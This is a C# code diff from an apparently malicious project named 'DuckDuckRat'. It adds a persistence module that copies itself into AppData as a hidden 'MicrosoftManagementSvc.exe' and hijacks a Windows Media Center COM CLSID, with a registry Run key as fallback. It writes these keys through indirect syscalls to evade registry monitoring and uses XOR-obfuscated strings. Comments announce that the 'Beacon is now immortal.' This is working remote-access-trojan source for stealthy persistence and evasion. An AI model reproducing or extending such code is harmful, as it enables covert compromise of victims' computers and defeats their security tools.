@@ -3,61 +3,105 @@ using System.IO;
 using System.Security.Principal;
 using System.Runtime.InteropServices;
 using System.Text;
-using VanguardCore;
+using System.Diagnostics;
+using DuckDuckRat;
 
-namespace VanguardCore.Defense
+namespace DuckDuckRat.Defense
 {
     public static class PersistenceService
     {
-        // [PRO] Stealth Native Persistence via Indirect Syscalls
-        // Bypassing RegistryFilter callbacks by using NtCreateKey / NtSetValueKey
+        // [SENTINEL] Tier-1 Stealth Persistence (Indirect Syscalls Only)
+        // Primary: COM Hijacking (Windows Media Center Proxy)
+        // Fallback: Registry Run (NtSetValueKey)
         
-        private static readonly byte[] _clsidEnc = { 0x4C, 0x76, 0x72, 0x67, 0x62, 0x61, 0x07, 0x04, 0x77, 0x70, 0x07, 0x40, 0x79, 0x74, 0x76, 0x70, 0x07, 0x6E, 0x70, 0x71, 0x00, 0x07, 0x77, 0x76, 0x71, 0x4E, 0x7E, 0x70, 0x74, 0x71, 0x41, 0x74, 0x71, 0x76, 0x00, 0x0F, 0x7F }; 
-        
-        private static string D(byte[] b) {
+        private const string COM_GUID = "{884e2008-217d-11da-b2a4-000e7bbb2c09}"; // Windows Media Center
+        private static readonly byte[] _runKeyEnc = { 0x64, 0x18, 0x11, 0x03, 0x00, 0x16, 0x16, 0x02, 0x12, 0x47, 0x1A, 0x1E, 0x14, 0x05, 0x18, 0x14, 0x18, 0x11, 0x03, 0x47, 0x00, 0x1E, 0x17, 0x13, 0x18, 0x00, 0x04, 0x47, 0x14, 0x02, 0x05, 0x1D, 0x12, 0x17, 0x03, 0x36, 0x12, 0x05, 0x11, 0x1E, 0x18, 0x17, 0x47, 0x05, 0x02, 0x17 }; 
+
+        private static string X(byte[] b) {
             byte[] d = new byte[b.Length];
             for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x37);
             return Encoding.UTF8.GetString(d);
         }
 
-        public static void InstallStealthProxy()
+        public static void InstallPersistence()
         {
             try
             {
                 SyscallManager.Initialize();
-                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
-                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
-                if (ntCreateKey == null || ntSetValueKey == null) return;
-
+                Console.WriteLine("[Ghost] Initializing Stealth Persistence sequence...");
+                
                 string ghostPath = GhostSelf();
                 if (string.IsNullOrEmpty(ghostPath)) return;
 
-                // [PRO] Resolve Native Registry Path (\Registry\User\<SID>\...)
-                string userSid = WindowsIdentity.GetCurrent().User?.Value ?? "";
-                if (string.IsNullOrEmpty(userSid)) return;
+                // 1. COM Hijacking (LocalServer32) - Primary
+                bool comSvc = InstallComHijack(ghostPath);
+                
+                // 2. Registry Run - Fallback
+                bool regRun = InstallRegistryRun(ghostPath);
 
-                // Software\Classes\CLSID\{...}\LocalServer32
-                string subKeyPath = $@"Software\Classes\CLSID\{D(_clsidEnc)}\LocalServer32";
-                string nativePath = $@"\Registry\User\{userSid}\{subKeyPath}";
+                if (comSvc || regRun)
+                    Console.WriteLine("[Ghost] Persistence verified. Beacon is now immortal.");
+            }
+            catch (Exception ex) { Console.WriteLine($"[Ghost] ERR: {ex.Message}"); }
+        }
 
-                // 1. Create/Open Key
-                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40); // OBJ_CASE_INSENSITIVE
+        public static bool InstallComHijack(string targetPath)
+        {
+            try
+            {
+                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
+                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
+                if (ntCreateKey == null || ntSetValueKey == null) return false;
+
+                string sid = WindowsIdentity.GetCurrent().User?.Value ?? "";
+                string nativePath = $@"\Registry\User\{sid}\Software\Classes\CLSID\{COM_GUID}\LocalServer32";
+
+                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40);
                 IntPtr hKey; uint disp;
-                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp); // KEY_ALL_ACCESS
+                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp);
                 oa.Free();
 
                 if (status == 0 && hKey != IntPtr.Zero)
                 {
-                    // 2. Set Value (Default value is empty name)
-                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING("");
-                    byte[] data = Encoding.Unicode.GetBytes(ghostPath + "\0");
-                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length); // REG_SZ
+                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING(""); // Default value
+                    byte[] data = Encoding.Unicode.GetBytes(targetPath + "\0");
+                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length);
                     valName.Free();
-                    
-                    CloseHandle(hKey);
+                    NtClose(hKey);
+                    return true;
                 }
-            }
-            catch { }
+            } catch { }
+            return false;
+        }
+
+        public static bool InstallRegistryRun(string targetPath)
+        {
+            try
+            {
+                var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
+                var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
+                if (ntCreateKey == null || ntSetValueKey == null) return false;
+
+                string sid = WindowsIdentity.GetCurrent().User?.Value ?? "";
+                string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+                string nativePath = $@"\Registry\User\{sid}\{subKey}";
+
+                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40);
+                IntPtr hKey; uint disp;
+                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp);
+                oa.Free();
+
+                if (status == 0 && hKey != IntPtr.Zero)
+                {
+                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING("MicrosoftManagementSvc");
+                    byte[] data = Encoding.Unicode.GetBytes($"\"{targetPath}\" /background\0");
+                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length);
+                    valName.Free();
+                    NtClose(hKey);
+                    return true;
+                }
+            } catch { }
+            return false;
         }
 
         private static string GhostSelf()
@@ -67,11 +111,16 @@ namespace VanguardCore.Defense
                 string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                 string ghostDir = Path.Combine(appData, "Microsoft", "Windows", "SoftwareUpdate");
                 if (!Directory.Exists(ghostDir)) Directory.CreateDirectory(ghostDir);
-                string ghostPath = Path.Combine(ghostDir, "winlogon.exe");
+                
+                string ghostName = "MicrosoftManagementSvc.exe";
+                string ghostPath = Path.Combine(ghostDir, ghostName);
 
-                string selfPath = GetSelfPath();
-                if (!File.Exists(ghostPath))
+                string selfPath = Environment.ProcessPath ?? "";
+                if (string.Compare(selfPath, ghostPath, StringComparison.OrdinalIgnoreCase) != 0)
                 {
+                    if (File.Exists(ghostPath)) {
+                        try { File.Delete(ghostPath); } catch { }
+                    }
                     File.Copy(selfPath, ghostPath, true);
                     File.SetAttributes(ghostPath, FileAttributes.Hidden | FileAttributes.System);
                 }
@@ -80,15 +129,8 @@ namespace VanguardCore.Defense
             catch { return null; }
         }
 
-        private static string GetSelfPath()
-        {
-            var sb = new StringBuilder(1024);
-            Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
-            return sb.ToString();
-        }
-
-        [DllImport("kernel32.dll", EntryPoint = "GetModuleFileNameW")] private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);
         [DllImport("ntdll.dll")] private static extern uint NtClose(IntPtr handle);
-        private static void CloseHandle(IntPtr h) => NtClose(h);
     }
 }
+
+
